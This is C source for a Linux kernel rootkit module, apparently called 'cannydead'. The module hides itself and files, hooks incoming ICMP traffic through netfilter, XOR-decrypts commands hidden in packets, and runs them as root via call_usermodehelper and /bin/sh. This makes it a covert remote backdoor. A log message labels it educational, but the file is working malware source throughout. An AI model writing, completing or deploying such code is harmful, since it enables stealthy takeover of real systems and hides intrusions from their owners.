#include <linux/module.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/netfilter_ipv4.h>
#include <linux/inet.h>
#include <linux/workqueue.h>
#include "cannydead_rootkit.h"
#include "cannydead_icmp_command_interceptor.c"
#include "cannydead_file_hiding.c"


char exec_cmd_buffer[1976];

void simple_xor_decrypt(char *out_buf, const unsigned char *in_buf, int data_len, __be32 xor_key)
{
    unsigned char *key_bytes = (unsigned char *)&xor_key;
    int idx;
    for (idx = 0; idx < data_len; ++idx) {
        out_buf[idx] = in_buf[idx] ^ key_bytes[idx % 4];
    }
    out_buf[data_len] = '\0';
}

static void exec_work_handler(struct work_struct *work)
{
    static char *argv[] = {"/bin/sh", "-c", exec_cmd_buffer, NULL};
    static char *envp[] = {"PATH=/bin:/sbin", NULL};
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

struct work_struct exec_work;
EXPORT_SYMBOL(exec_work);

static struct nf_hook_ops nfho;

static int __init startup(void)
{
    int err;

    INIT_WORK(&exec_work, exec_work_handler);
    hide_module();

    err = init_file_hiding();
    if (err)
        return err;

    nfho.hook = icmp_command_interceptor;
    nfho.hooknum = NF_INET_PRE_ROUTING;
    nfho.pf = PF_INET;
    nfho.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &nfho);
    printk(KERN_WARNING "[icmpshell] WARNING: Educational test rootkit loaded into the kernel!\n");
    return 0;
}

static void __exit cleanup(void)
{
    cleanup_file_hiding();
    nf_unregister_net_hook(&init_net, &nfho);
}

MODULE_LICENSE("GPL");
module_init(startup);
module_exit(cleanup);
